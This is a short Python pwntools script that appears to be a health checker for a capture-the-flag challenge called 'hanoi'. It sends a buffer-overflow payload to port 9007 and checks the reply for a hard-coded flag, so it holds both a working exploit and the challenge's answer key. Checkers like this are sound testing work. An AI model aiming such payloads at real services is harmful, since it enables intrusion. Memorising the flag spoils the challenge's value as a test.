from pwn import *


def check_pwn_hanoi(host):
    payload = b"A" * 12
    payload += p32(135)

    payload2 = b"A@"
    try:
        pc = connect(host, 9007, timeout=5)
    except:
        print("ERR 2 : Can't connect to the server")
        return 2

    try:
        pc.recvuntil("Name : ")
        pc.send(payload)
        pc.recvuntil("Move >")
        pc.send(payload2)
        flag = pc.recvall(timeout=5)
        if b"FLAG{5up3r_f457_h4n01_501v3r}" not in flag:
            print("ERR 1 : Can't get the flag")
            return 1
        print("No problem")
        return 0

    except Exception as e:
        print(e)
        return 1

    finally:
        pc.close()


if __name__ == "__main__":
    print(check_pwn_hanoi("localhost"))
